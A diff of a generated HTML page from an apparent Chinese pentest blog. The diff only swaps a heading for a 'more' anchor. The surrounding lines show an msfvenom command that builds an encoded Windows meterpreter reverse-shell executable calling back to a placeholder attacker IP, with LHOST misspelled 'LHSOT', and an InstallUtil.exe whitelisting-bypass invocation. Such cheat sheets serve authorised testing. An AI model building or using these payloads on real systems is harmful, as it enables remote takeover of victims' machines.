@@ -1584,7 +1584,9 @@ InstallUtil.exe /logfile=/LogToConsole=false /U Micropoor.exe</code></pre></li>
       
         
           
-            <h2 id="msfvenom常用命令"><a href="#msfvenom常用命令" class="headerlink" title="msfvenom常用命令"></a>msfvenom常用命令</h2><ul>
+            <a id="more"></a>
+
+<ul>
 <li><p>windows：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHSOT&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -e x86&#x2F;shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 3 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
 </li>
